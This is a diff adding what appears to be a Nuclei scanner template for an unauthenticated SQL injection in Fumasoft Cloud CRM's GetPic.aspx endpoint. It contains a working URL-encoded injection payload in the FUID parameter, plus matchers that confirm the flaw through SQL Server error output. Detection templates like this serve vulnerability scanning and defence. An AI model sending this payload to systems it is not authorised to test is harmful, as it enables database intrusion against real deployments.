@@ -1,0 +1,30 @@
+id: fumasoft-GetPic-sqli
+info:
+  name: 孚盟云CRM GetPic.aspx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetPic.aspx接口存在 SQL注入漏洞。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/oxq54lg7iam2ao1e
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fumasoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /Common/GetPic.aspx?FUID=%2d%31%27%41%4e%44%20%31%3d%40%40%56%45%52%53%49%4f%4e%2d%2d HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
